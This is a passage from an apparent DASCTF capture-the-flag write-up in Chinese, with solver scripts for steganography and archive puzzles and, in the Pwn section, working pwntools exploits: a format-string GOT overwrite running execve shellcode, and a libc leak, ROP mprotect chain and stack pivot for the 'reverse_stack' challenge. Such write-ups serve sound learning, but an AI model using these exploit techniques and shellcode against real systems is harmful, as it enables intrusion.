function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aaa</span>));</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/6K4Yt3uARgp1Ckn.png"
                        alt="image-20241109142148338"
                 ></p>
<h3 id="Misc">Misc</h3>
<h4 id="FinalLogin">FinalLogin</h4>
<p>SNOW隐写了XOR密钥</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/3uXIEJ2KagbQ7Cq.png"
                        alt="image-20241109091313041"
                 ></p>
<p>赛博厨子直接出</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/rwTu2FflSVExdct.png"
                        alt="image-20241109091340198"
                 ></p>
<h4 id="非黑即白">非黑即白</h4>
<p>下载附件并解压得到一个逆序的gif图片，直接将图片逆序回来，然后用工具分帧</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/muJgPt2Ljz7fwi8.png"
                        alt="image-20241109141605498"
                 ></p>
<p>然后写个脚本提取二进制数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">hash_lst = &#123;&#125;</span><br><span class="line">pixel_list = &#123;&#125;</span><br><span class="line">data_list = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1536</span>):</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line">    tmp_img = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    tmp_pixel = tmp_img.getpixel((<span class="number">0</span>,<span class="number">0</span>))[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(tmp_pixel)</span></span><br><span class="line">    <span class="keyword">if</span> tmp_pixel &lt; <span class="number">200</span>:</span><br><span class="line">        data_list += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data_list += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data_list) </span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/MPsnpjlZcWKmiyw.png"
                        alt="image-20241109141725677"
                 ></p>
<p>下载可以得到一个压缩包</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/SdYfpcewB3xTrEi.png"
                        alt="image-20241109141749001"
                 ></p>
<p>GIF帧间隔隐写了解压密码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/aoVY4qR2SnsEJBC.png"
                        alt="image-20241109141852400"
                 ></p>
<p>使用得到的密码解压即可得到flag</p>
<p><strong>DASCTF{H3r3_1s_C0L0rful_W0rld}</strong></p>
<h4 id="天命人（赛后复现）">天命人（赛后复现）</h4>
<p>题目附件给了一个压缩包，压缩包的注释中有提示</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/qdSbJMImCV2NKDn.png"
                        alt="image-20241109233650821.png"
                 ></p>
<p>解压后用010打开，发现就是把一个压缩包的数据按照顺序分到了六个文件里</p>
<p>因此我们写个脚本，按照顺序恢复一下压缩包即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data3 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data4 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data5 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data6 = f.read()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data4))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data5))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data6))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">387797</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res.append(data1[i])</span><br><span class="line">        res.append(data2[i])</span><br><span class="line">        res.append(data3[i])</span><br><span class="line">        res.append(data4[i])</span><br><span class="line">        res.append(data5[i])</span><br><span class="line">        res.append(data6[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(res))</span><br></pre></td></tr></table></figure>
<p>解压得到的压缩包，又可以得到两个新的加密的压缩包</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/QHTcOW1BqhiXMwU.png"
                        alt="image-20241109233851218.png"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/V12kDCIR5Wq8uGa.png"
                        alt="image-20241109233903989.png"
                 ></p>
<p>发现根器.zip中的文件很短，只有几字节，因此可以直接使用<code>CRC32</code>爆破文件内容</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/m3fcE4dW2wpXPJu.png"
                        alt="image-20241109234003835.png"
                 ></p>
<p>爆破后即可得到另一个压缩包的解压密码：<code>C0M3_4ND_Get_S1X_R00TS!!</code></p>
<p>使用得到的密码解压<code>未竟.zip</code>，可以得到一张png图片，还有一个名为<code>紧箍咒</code>的未知后缀的数据文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/Wj18kbEOCmftK7G.png"
                        alt="image-20241110114410382.png"
                 ></p>
<p>发现png图片中存在等距像素隐写，因此我们尝试等距提取像素，这里我就直接用了B神的代码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/c81ZBiasgk72D4f.png"
                        alt="image-20241109234246782.png"
                 ></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># cv2.imshow(new_img)</span></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我们这里把图片重命名为1.png，然后输入以下命令提取等距像素点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Get_Pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/TG3q7dmDUwcgKb5.png"
                        alt="image-20241109234710761.png"
                 ></p>
<p>这张图片提示了另一个<code>紧箍咒</code>文件是一个Veracrypt加密的磁盘文件</p>
<p>刚刚好之前的那张图片显示的也是金箍棒，因此我们把之前的那张图片作为密钥文件，并输入密码<code>jinggubang</code>挂载</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/3kRUmJtf8FrxYys.png"
                        alt="image-20241110114047596.png"
                 ></p>
<p>挂载成功后即可得到flag：<code>DASCTF&#123;T1m3_t0_F4Ce_De5t1nY&#125;</code></p>
<h3 id="Pwn">Pwn</h3>
<h4 id="printFFF">printFFF</h4>
<p>存在格式化字符串漏洞，将exit的got修改为写入的shellcode地址即可执行shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.timeout = <span class="number">5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.37&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, <span class="subst">&#123;u64(<span class="string">b&quot;/bin/sh&quot;</span> + <span class="built_in">bytearray</span>([<span class="number">0</span>]))&#125;</span></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    s(shellcode)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    pay = p64(<span class="number">0x5000</span>) + p64(elf.got[<span class="string">&quot;exit&quot;</span>])</span><br><span class="line">    pay += p64(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x401258&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h4 id="reverse-stack">reverse_stack</h4>
<p>开辟在mmap地址上的反向stack，mmap地址和libc基址偏移固定，可泄露出libc基址</p>
<p>rsp会根据我们写入的len增加，写入负数值后，新开辟的栈会到原先的栈的上面，因此可以覆盖原先栈的rbp和返回地址实现栈迁移，打rop即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.timeout = 5</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;10.1.112.38&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line">log = <span class="keyword">lambda</span> name, data:      success(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;data:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x23000</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, <span class="subst">&#123;u64(<span class="string">b&quot;./flag&quot;</span> + <span class="built_in">bytearray</span>([<span class="number">0</span>,<span class="number">0</span>]))&#125;</span></span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x40</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x40</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 1 leak</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    pay = p64(<span class="number">0x300</span>)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    addr = u64(p.recvn(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">    target = addr + <span class="number">0x18</span></span><br><span class="line">    libc.address = addr + <span class="number">0x23000</span></span><br><span class="line">    leave_ret = libc.address + <span class="number">0x000000000004da83</span></span><br><span class="line">    log(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;pill?\n&quot;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;blue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2 gadgets</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0x300</span>))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    rop = ROP(libc, base=target)</span><br><span class="line">    rop.call(<span class="string">&quot;mprotect&quot;</span>, [target &amp; ~<span class="number">0xfff</span>, <span class="number">0x1000</span>, <span class="number">7</span>])</span><br><span class="line">    rop.raw(target + <span class="number">0x48</span>)</span><br><span class="line">    info(rop.dump())</span><br><span class="line">    pay = rop.chain() + shellcode</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hijack</span></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0xFFFFFFFFFFFFFF79</span>))</span><br><span class="line">    ru(<span class="string">b&quot;buf\n&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;bbase 0x121F&#x27;)</span></span><br><span class="line">    sa(<span class="string">b&quot;pill?\n&quot;</span>, <span class="string">b&#x27;red&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;buf\n&#x27;</span>)</span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(leave_ret) + p64(target - <span class="number">0x8</span>)</span><br><span class="line">    s(pay)</span><br><span class="line">    p.recvn(<span 